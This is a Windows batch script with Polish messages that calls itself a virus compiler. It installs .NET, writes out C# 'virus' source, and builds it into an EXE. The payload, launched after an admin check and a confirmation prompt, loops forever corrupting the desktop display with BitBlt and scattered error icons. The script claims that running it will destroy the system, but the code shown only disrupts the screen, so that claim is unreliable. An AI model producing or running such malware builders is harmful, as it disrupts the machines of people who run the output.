@echo off
:: Sprawdzanie uprawnien admina
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] MUSISZ URUCHOMIC JAKO ADMIN!
    pause
    exit
)

title ROFUCKED COMPILER v5
color 0C
set "workDir=%userprofile%\Desktop\MalwareLab"
if not exist "%workDir%" mkdir "%workDir%"
cd /d "%workDir%"

:: 1. Instalacja .NET SDK (jeśli brak)
dotnet --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Pobieranie srodowiska .NET...
    powershell -Command "Invoke-WebRequest -Uri 'https://dot.net/v1/dotnet-install.ps1' -OutFile 'dotnet-install.ps1'"
    powershell -ExecutionPolicy Bypass -File "dotnet-install.ps1" -Channel 6.0
    set "PATH=%PATH%;%LocalAppData%\Microsoft\dotnet"
)

:: 2. Inicjalizacja projektu Windows Forms (wymagane dla Twojego kodu)
echo [*] Tworzenie projektu...
dotnet new winforms --force > project.csproj
:: Podmieniamy kod w Program.cs na Twój kod wirusa
echo [*] Wstrzykiwanie kodu wirusa...

(
echo using System;
echo using System.Diagnostics;
echo using System.Collections.Generic;
echo using System.IO;
echo using System.Threading;
echo using System.Windows.Forms;
echo using System.Runtime.InteropServices;
echo using System.Drawing;
echo using System.Security.Principal;
echo using Microsoft.Win32;
echo.
echo class InternalSystemModule {
echo     [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
echo     [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
echo     [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
echo     [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
echo     [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
echo     static Random rnd = new Random();
echo     static bool IsAdmin() { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); }
echo.
echo     [STAThread]
echo     static void Main() {
echo         if (!IsAdmin()) return;
echo         if (MessageBox.Show("URUCHOMIC DESTRUKCJE?", "SYSTEM_X", MessageBoxButtons.YesNo) == DialogResult.Yes) {
echo             new Thread(Payload).Start();
echo         }
echo     }
echo.
echo     static void Payload() {
echo         IntPtr hdc = GetDC(IntPtr.Zero);
echo         RECT r; GetWindowRect(GetDesktopWindow(), out r);
echo         while(true) {
echo             BitBlt(hdc, rnd.Next(5), rnd.Next(5), r.Right, r.Bottom, hdc, 0, 0, 0x00CC0020);
echo             if(rnd.Next(100) > 95) Graphics.FromHdc(hdc).DrawIcon(SystemIcons.Error, rnd.Next(r.Right), rnd.Next(r.Bottom));
echo             Thread.Sleep(10);
echo         }
echo     }
echo }
) > Program.cs

:: 3. Kompilacja do pliku EXE
echo [*] Kompilacja w toku...
dotnet build -c Release

cls
echo ===================================================
echo   KOMPILACJA ZAKONCZONA!
echo   Lokalizacja: %workDir%\bin\Release\net6.0\
echo   PLIK: project.exe (LUB NAZWA PROJEKTU)
echo.
echo   UWAGA: URUCHOMIENIE PLIKU ZNISZCZY SYSTEM!
echo ===================================================
pause
